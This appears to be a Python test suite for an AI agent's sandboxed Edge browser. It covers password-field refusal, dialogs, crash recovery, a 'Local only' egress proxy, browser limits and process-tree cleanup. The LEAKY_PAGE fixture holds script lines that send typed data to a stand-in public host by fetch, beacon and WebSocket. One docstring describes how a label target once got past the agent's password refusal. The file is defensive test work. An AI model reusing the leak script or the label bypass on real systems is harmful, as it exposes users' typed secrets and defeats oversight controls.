"""v1.376.0 (IJ harness part 2, Phase 5) REVIEW — the agent's browser, each
defect the review found pinned red-first.

Real-Edge pins run against a local ``http.server`` (never the network) and
are skipped when Edge or Playwright's driver is missing; the rest use the
fake browser of ``tests/test_build_browser_v1376.py``.
"""

from __future__ import annotations

import asyncio
import http.server
import sys
import threading
import time
from typing import Any

import pytest

from iron_jarvis.harness import page_browser as PB

EDGE = PB.edge_executable()
REAL = pytest.mark.skipif(
    not EDGE or bool(PB.playwright_problem()) or sys.platform != "win32",
    reason="needs the installed Microsoft Edge and Playwright's driver (Windows)",
)


class Site:
    """A local http.server that serves ``pages`` (path -> html) and records
    every request it got (``hits``: (host header, path))."""

    def __init__(self, pages: "dict[str, str]", redirects: "dict[str, str] | None" = None) -> None:
        self.hits: list[tuple[str, str]] = []
        site = self
        self.pages = pages
        self.redirects = dict(redirects or {})

        class H(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a: Any) -> None:
                pass

            def _serve(self) -> None:
                site.hits.append((str(self.headers.get("Host") or ""), self.path))
                path = self.path.split("?", 1)[0]
                if path in site.redirects:
                    self.send_response(302)
                    self.send_header("Location", site.fill(site.redirects[path]))
                    self.end_headers()
                    return
                html = site.pages.get(path)
                if html is None:
                    self.send_response(404)
                    self.end_headers()
                    return
                body = site.fill(html).encode()
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            do_GET = _serve
            do_POST = _serve

        self.srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), H)
        self.port = self.srv.server_address[1]
        threading.Thread(target=self.srv.serve_forever, daemon=True).start()

    def fill(self, text: str) -> str:
        return text.replace("PUBLIC", f"public.test:{self.port}").replace("PORT", str(self.port))

    @property
    def base(self) -> str:
        return f"http://127.0.0.1:{self.port}/"

    def close(self) -> None:
        self.srv.shutdown()
        self.srv.server_close()


def _browsers() -> PB.AgentBrowsers:
    b = PB.AgentBrowsers()
    b.extra_args = ("--host-resolver-rules=MAP public.test 127.0.0.1",)
    return b


# --------------------------------------------------------------------------- #
# typing: a LABEL is not a way round the password refusal
# --------------------------------------------------------------------------- #

LABEL_PAGE = """<html><head><title>Sign in</title></head><body>
<p id=out>typed nothing</p>
<label for=pw id=lab>Secret</label>
<input type=password id=pw oninput="document.getElementById('out').textContent='typed into pw'">
<label id=wrap>Wrap <input type=password id=pw2 oninput="document.getElementById('out').textContent='typed into pw2'"></label>
<span id=inner>inside</span>
<label id=deep>Deep <span id=deepspan>here</span> <input type=password id=pw3 oninput="document.getElementById('out').textContent='typed into pw3'"></label>
<label id=fine for=email>Email</label><input id=email>
</body></html>"""


@REAL
@pytest.mark.timeout(180)
async def test_real_edge_typing_through_a_label_of_a_password_field_is_refused():
    """Playwright's fill() FOLLOWS A LABEL to its control (``retarget(...,
    'follow-label')``): a css target naming the <label> of a password field,
    or a label wrapping one, or a span inside such a label, typed the text
    into the password field while the refusal read the LABEL's facts (no
    type, no words) and let it through."""
    site = Site({"/": LABEL_PAGE})
    b = _browsers()
    key = "build:label"
    try:
        await b.open(key, site.base, preview=site.base)
        for target in ({"css": "#lab"}, {"css": "#wrap"}, {"css": "#deepspan"}):
            with pytest.raises(PB.BrowserProblem, match="password"):
                await b.type(key, target, "hunter2", preview=site.base)
        read = await b.read(key, preview=site.base)
        assert "typed nothing" in read.text, read.text
        # A label of an ordinary field still types into it.
        done = await b.type(key, {"css": "#fine"}, "a@b.test", preview=site.base)
        assert done.did == "Typed"
    finally:
        b.shutdown()
        site.close()


# --------------------------------------------------------------------------- #
# dialogs: the agent's own navigation leaves a page that asks before leaving
# --------------------------------------------------------------------------- #

DIRTY_PAGE = """<html><head><title>Form</title></head><body>
<p id=out>clean</p>
<input id=dirty placeholder="Notes" oninput="window.onbeforeunload=function(e){e.preventDefault();e.returnValue='sure?';return 'sure?'}">
<button onclick="document.getElementById('out').textContent = confirm('Really delete?') ? 'confirmed' : 'kept'">Ask</button>
</body></html>"""


@REAL
@pytest.mark.timeout(180)
async def test_real_edge_a_page_that_asks_before_leaving_does_not_trap_the_agent():
    """A page with unsaved changes (``onbeforeunload``) answered by DISMISS
    cancelled the agent's own page_open, which then failed with words about a
    download. The agent asked to go: the browser leaves and says the page
    asked. A confirm() is still answered Cancel (never yes for the user)."""
    site = Site({"/": DIRTY_PAGE, "/two": "<title>Two</title>two"})
    b = _browsers()
    key = "build:dirty"
    try:
        await b.open(key, site.base, preview=site.base)
        await b.click(key, "Ask", preview=site.base)
        read = await b.read(key, preview=site.base)
        assert "kept" in read.text
        assert any("Really delete?" in d and "Cancel" in d for d in read.dialogs), read.dialogs
        await b.type(key, "Notes", "half-written", preview=site.base)
        moved = await b.open(key, site.base + "two", preview=site.base)
        assert moved.title == "Two" and moved.url.endswith("/two")
        read = await b.read(key, preview=site.base)
        assert any("before leaving" in d for d in read.dialogs), read.dialogs
    finally:
        b.shutdown()
        site.close()


# --------------------------------------------------------------------------- #
# a browser whose Edge was closed (by the user, a crash) starts again
# --------------------------------------------------------------------------- #


@REAL
@pytest.mark.timeout(180)
async def test_real_edge_a_browser_whose_edge_died_is_replaced_on_the_next_open():
    """Edge killed under the agent: every later page_open raised a raw
    TargetClosedError and the session had no browser until it idled out
    (10 minutes). Now the dead browser is closed (its job, its folder) and
    page_open starts a fresh one, saying so."""
    import psutil

    site = Site({"/": "<title>Shop</title>shop"})
    b = _browsers()
    key = "build:dead"

    async def kill_edge() -> "tuple[list[int], Any]":
        old = b.pids(key)
        work = b._sessions[key].work
        main = [
            p for p in old
            if psutil.pid_exists(p)
            and psutil.Process(p).name().lower() == "msedge.exe"
            and "--type=" not in " ".join(psutil.Process(p).cmdline())
        ]
        assert main, old
        psutil.Process(main[0]).kill()
        for _ in range(100):
            if not psutil.pid_exists(main[0]):
                break
            await asyncio.sleep(0.05)
        await asyncio.sleep(1.0)
        return old, work

    async def none_left(old: "list[int]") -> None:
        left = [p for p in old if psutil.pid_exists(p) and p not in b.pids(key)]
        deadline = time.monotonic() + 15
        while left and time.monotonic() < deadline:
            await asyncio.sleep(0.2)
            left = [p for p in left if psutil.pid_exists(p)]
        assert left == []

    try:
        await b.open(key, site.base, preview=site.base)
        # 1. The next call is page_open: a fresh browser, and it says so.
        old, work = await kill_edge()
        fresh = await b.open(key, site.base, preview=site.base)
        assert fresh.title == "Shop"
        assert any("fresh one was opened" in line for line in fresh.blocked), fresh.blocked
        assert b._sessions[key].work != work and not work.exists()
        await none_left(old)
        # 2. The next call reads: the dead browser is closed, in words.
        old, work = await kill_edge()
        with pytest.raises(PB.BrowserProblem, match="had stopped"):
            await b.read(key, preview=site.base)
        assert not b.is_open(key) and not work.exists()
        await none_left(old)
        again = await b.open(key, site.base, preview=site.base)
        assert again.title == "Shop"
    finally:
        b.shutdown()
        site.close()


# --------------------------------------------------------------------------- #
# Local only: nothing the agent's browser does reaches a public address
# --------------------------------------------------------------------------- #

LEAKY_PAGE = """<html><head><title>Leaky</title>
<script src="http://PUBLIC/cdn.js"></script>
</head><body><p id=o>waiting</p>
<img src="http://PUBLIC/pixel.png">
<script>
fetch('http://PUBLIC/api?typed=secret-ish').catch(function () {});
navigator.sendBeacon('http://PUBLIC/beacon', 'what the agent typed');
try { new WebSocket('ws://PUBLIC/ws'); } catch (e) {}
fetch('/local-api').then(function (r) { return r.text(); })
  .then(function (t) { document.getElementById('o').textContent = t; });
</script>
<a href="/hop">a server redirect to a public site</a>
</body></html>"""


def _public_hits(site: Site) -> list[tuple[str, str]]:
    return [h for h in site.hits if h[0].startswith("public.test")]


@REAL
@pytest.mark.timeout(240)
async def test_real_edge_local_only_reaches_no_public_address_at_all():
    """DECISION (review, item 2b): outside Local only a page's own requests
    go where the page sends them (a CDN script, its API) — like any browser
    and the Browser pane. Under LOCAL ONLY nothing the agent's browser does
    reaches a public address: it runs behind a proxy that refuses everything
    outside this PC and the user's network, so a sub-resource, a fetch, a
    beacon, a WebSocket and a server redirect's next hop never leave."""
    from iron_jarvis.providers import egress

    pages = {"/": LEAKY_PAGE, "/local-api": "local answer"}
    site = Site(pages, redirects={"/hop": "http://PUBLIC/landed?carried=1"})
    b = _browsers()
    key = "build:local"
    try:
        # Outside Local only the page's requests go out (the decision's
        # other half — and the proof the page really makes them).
        await b.open(key, site.base, preview=site.base)
        await asyncio.sleep(1.0)
        assert {"/cdn.js", "/api?typed=secret-ish", "/beacon"} <= {p for _, p in _public_hits(site)}
        await b.close(key, "test")
        site.hits.clear()
        with egress.local_only_scope(True):
            opened = await b.open(key, site.base, preview=site.base)
            await asyncio.sleep(1.5)
            read = await b.read(key, preview=site.base)
            assert "local answer" in read.text  # this PC still answers
            hop = await b.click(key, "a server redirect to a public site", preview=site.base)
        assert opened.title == "Leaky"
        assert _public_hits(site) == [], site.hits
        assert hop.url.rstrip("/") == site.base.rstrip("/")
        assert any("Local only" in line for line in read.failed), read.failed
    finally:
        b.shutdown()
        site.close()


async def test_a_browser_started_outside_local_only_starts_again_inside_it(tmp_path, monkeypatch):
    """The proxy is chosen when Edge starts, so a browser that was opened
    outside Local only is never used inside it (and back): it is closed and
    the next page_open starts one for the turn's setting, saying so."""
    from iron_jarvis.providers import egress
    from tests.test_build_browser_v1376 import DEV, FakeBackend

    made: list[Any] = []

    def factory(**kw):
        backend = FakeBackend(**{k: v for k, v in kw.items() if k != "local_only"})
        backend.local_only = bool(kw.get("local_only"))
        made.append(backend)
        return backend

    inst = PB.AgentBrowsers(backend_factory=factory)
    try:
        await inst.open("build:s", DEV, preview=DEV)
        assert made[-1].local_only is False
        with egress.local_only_scope(True):
            # The next call opens: a browser for Local only, and it says so.
            res = await inst.open("build:s", DEV, preview=DEV)
            assert made[-1].local_only is True and made[0].killed
            assert any("Local only was turned on" in line for line in res.blocked), res.blocked
            await inst.read("build:s", preview=DEV)  # the same browser now
        assert len(made) == 2
        # Local only off again; the next call reads: closed, in words.
        with pytest.raises(PB.BrowserProblem, match="Local only was turned off"):
            await inst.read("build:s", preview=DEV)
        assert made[1].killed and not inst.is_open("build:s")
        await inst.open("build:s", DEV, preview=DEV)
        assert len(made) == 3 and made[-1].local_only is False
    finally:
        inst.shutdown()


def test_the_local_only_proxy_lets_through_exactly_the_private_addresses():
    """The proxy's bypass list is built FROM egress's one definition of
    "this PC or your network" (its address blocks and name suffixes), so the
    two can never drift."""
    from iron_jarvis.providers import egress

    rules = PB.local_only_bypass().split(";")
    for net in egress._PRIVATE_NETS:
        assert str(net) in rules, net
    for suffix in egress.PRIVATE_SUFFIXES:
        assert "*" + suffix in rules, suffix
    assert {"localhost", "*.localhost", "<local>"} <= set(rules)


# --------------------------------------------------------------------------- #
# at most MAX_BROWSERS agent browsers at once
# --------------------------------------------------------------------------- #


async def test_at_most_four_browsers_the_least_recently_used_idle_one_makes_room(tmp_path):
    """DECISION (review item 4): each Edge is ~8 processes and a few hundred
    MB, and nothing capped them — one per Build session, kept for 10 idle
    minutes. Now at most MAX_BROWSERS run; a new one closes the session
    browser used least recently that is not acting (its pane says why), and
    when every one is acting the open is refused in words."""
    from tests.test_build_browser_v1376 import DEV, FakeBackend

    assert PB.MAX_BROWSERS == 4
    made: dict[str, Any] = {}

    def factory(**kw):
        backend = FakeBackend(**kw)
        return backend

    inst = PB.AgentBrowsers(backend_factory=factory)
    try:
        for n in range(4):
            await inst.open(f"build:{n}", DEV, preview=DEV)
            made[f"build:{n}"] = inst._sessions[f"build:{n}"].backend
        await inst.read("build:0", preview=DEV)  # build:1 is now the least recently used
        await inst.open("build:4", DEV, preview=DEV)
        assert sorted(inst.open_keys()) == ["build:0", "build:2", "build:3", "build:4"]
        assert made["build:1"].killed
        assert inst.view("build:1")["closed_reason"] == "room"
        # Every open browser is acting: the fifth is refused, nothing closed.
        for k in inst.open_keys():
            inst._sessions[k].backend.delay_s = 1.5
        busy = [asyncio.ensure_future(inst.click(k, "Log", preview=DEV)) for k in inst.open_keys()]
        await asyncio.sleep(0.5)
        with pytest.raises(PB.BrowserProblem, match="already have the agent's browser open"):
            await inst.open("build:5", DEV, preview=DEV)
        await asyncio.gather(*busy)
        assert len(inst.open_keys()) == 4 and not inst.is_open("build:5")
    finally:
        inst.shutdown()


# --------------------------------------------------------------------------- #
# every process of the browser's tree, inside the job or not
# --------------------------------------------------------------------------- #


@REAL
@pytest.mark.timeout(180)
async def test_real_edge_a_helper_edge_starts_outside_the_job_is_counted_and_ended():
    """MEASURED (review): ~2 s after it starts, Edge has an
    ``identity_helper.exe`` that is NOT in the browser's job (it is in a job
    of its own — Windows starts it for Edge — even when the job allows no
    breakaway). The doer's "every process Edge starts is born in the job"
    held only for a check made in the first two seconds, so the browser's
    process list (and its kill) missed it. Now the list is the job's members
    AND the driver's whole tree, and a close ends both."""
    import psutil

    site = Site({"/": "<title>Shop</title>shop"})
    b = _browsers()
    key = "build:tree"
    try:
        await b.open(key, site.base, preview=site.base)
        backend = b._sessions[key].backend
        outside: list[int] = []
        before: set[int] = set()
        deadline = time.monotonic() + 10
        while time.monotonic() < deadline:
            members = set(backend._job.member_pids())
            seen = {p for p in PB._tree_of(backend._driver) if p not in members}
            # One that STAYS (seen twice: a process the job is still taking
            # in reads as outside for an instant).
            outside = sorted(seen & before)
            if outside:
                break
            before = seen
            await asyncio.sleep(0.25)
        if not outside:
            pytest.skip("this Edge started no process outside the job")
        listed = set(b.pids(key))
        assert {p for p in outside if psutil.pid_exists(p)} <= listed, (outside, listed)
        tree = [psutil.Process(p) for p in PB._tree_of(backend._driver)]
        ended = set(await b.close(key, "test"))
        assert {p for p in outside if p in {t.pid for t in tree}} <= ended, (outside, ended)
        end = time.monotonic() + 15
        while time.monotonic() < end and any(p.is_running() for p in tree):
            await asyncio.sleep(0.2)
        assert not [p for p in tree if p.is_running()]
    finally:
        b.shutdown()
        site.close()


@pytest.mark.skipif(sys.platform != "win32", reason="a Windows job")
def test_kill_ends_a_process_of_the_tree_that_is_outside_the_job(tmp_path, monkeypatch):
    """The kill's half of the pin above, without Edge: a process of the
    driver's tree that the job does not hold (and that would not exit on its
    own) is ended by the close too."""
    import subprocess

    import psutil

    from iron_jarvis.core import procs

    sleeper = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(120)"])
    try:
        backend = PB.EdgeBackend(edge="edge", work=tmp_path, guard=lambda u: PB.Verdict("ok"),
                                 note=lambda k, t: None)
        backend._job = procs._Job.create(kill_on_close=True, below_normal=False)  # holds nothing
        backend._driver = 4242
        monkeypatch.setattr(PB, "_tree_procs", lambda pid: [psutil.Process(sleeper.pid)])
        ended = backend.kill()
        assert sleeper.pid in ended
        sleeper.wait(10)
        assert sleeper.poll() is not None
    finally:
        if sleeper.poll() is None:
            sleeper.kill()


# --------------------------------------------------------------------------- #
# no job, no browser (Windows)
# --------------------------------------------------------------------------- #


@REAL
@pytest.mark.timeout(120)
async def test_real_edge_no_job_for_the_driver_means_no_browser(monkeypatch):
    """DECISION (review item 4): on Windows the job is what makes "nothing
    outlives the daemon" true for a KILLED daemon. When the driver could not
    be put in one (``procs.adopt`` → None: no job object, access denied, or
    a Playwright whose driver pid is not where it was measured), the doer's
    code launched Edge anyway — on a kill path that a killed daemon never
    runs. Now the browser is not started, the driver is stopped, and the
    tool says why."""
    import psutil

    from iron_jarvis.core import procs

    drivers: list[int] = []
    real_pid = PB._driver_pid

    def spy(cm):
        pid = real_pid(cm)
        drivers.append(pid)
        return pid

    monkeypatch.setattr(PB, "_driver_pid", spy)
    monkeypatch.setattr(procs, "adopt", lambda *a, **k: None)
    site = Site({"/": "<title>Shop</title>shop"})
    b = _browsers()
    try:
        with pytest.raises(PB.BrowserProblem, match="could not hold"):
            await b.open("build:nojob", site.base, preview=site.base)
        assert not b.is_open("build:nojob")
        assert drivers and drivers[0]
        deadline = time.monotonic() + 10
        while time.monotonic() < deadline and psutil.pid_exists(drivers[0]):
            await asyncio.sleep(0.1)
        assert not psutil.pid_exists(drivers[0])
        assert site.hits == []  # Edge never opened the page
    finally:
        b.shutdown()
        site.close()
